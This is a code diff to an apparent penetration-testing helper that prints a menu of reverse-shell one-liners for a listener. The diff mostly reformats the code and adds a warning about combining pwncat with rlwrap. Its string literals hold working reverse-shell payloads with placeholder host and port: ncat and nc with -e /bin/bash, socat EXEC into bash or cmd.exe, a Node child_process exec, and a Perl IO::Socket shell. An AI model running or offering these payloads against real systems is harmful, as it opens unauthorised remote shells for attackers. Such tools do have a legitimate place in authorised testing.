@@ -161,6 +161,11 @@ def shell(listener: str):
             "pwncat works only with Linux, only showing universal and Linux-only reverse shells."
         )
 
+    # Warn and react to rlwrap and pwncat combination
+    if rlwrap and pwncat:
+        print("pwncat should do what rlwrap does (and more!) for Linux machines.  Are you sure, you want to use both? Re-enabling Linux-only reverse shells.")
+        rlwrap = False
+
     # Keeping with the random colors, but adding color coding for different OS
     os_colors = sample(color, 3)
     windows_color = os_colors[0]
@@ -191,29 +196,38 @@ def shell(listener: str):
 ╠═══════════════════════════════════════════════════
 ║ ncat --udp xxx yyy -e /bin/bash
 ╚═══════════════════════════════════════════════════
-""")
+"""
+        )
     if rlwrap:
         shells.append(windows_color)
-    shells.append(r"""
-╔Socat══════════════════════════════════════════════""")
+    shells.append(
+        r"""
+╔Socat══════════════════════════════════════════════"""
+    )
     if not rlwrap:
-        shells.append(r"""
-║ socat -d -d -d TCP4:xxx:yyy EXEC:/bin/bash""")
+        shells.append(
+            r"""
+║ socat -d -d -d TCP4:xxx:yyy EXEC:/bin/bash"""
+        )
         if pwncat:
             shells.append(
-            """
+                """
 ╚═══════════════════════════════════════════════════
-""")
+"""
+            )
     if not pwncat:
         shells.append(windows_color)
         if not rlwrap:
-            shells.append("""
-╠═══════════════════════════════════════════════════""")
+            shells.append(
+                """
+╠═══════════════════════════════════════════════════"""
+            )
         shells.append(
             r"""
 ║ Windows only ║ socat -d -d TCP4:xxx:yyy EXEC:'cmd.exe',pipes
 ╚══════════════╩════════════════════════════════════
-""")
+"""
+        )
     if not rlwrap:
         shells.append(linux_color)
         shells.append(
@@ -252,8 +266,10 @@ x('child_process').exec('nc xxx yyy -e /bin/bash')
 ╠═══════════════════════════════════════════════════"""
         )
     else:
-        shells.append("""
-╔PERL═══════════════════════════════════════════════""")
+        shells.append(
+            """
+╔PERL═══════════════════════════════════════════════"""
+        )
     shells.append(
         r"""
 ║ perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"xxx:yyy");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'"""
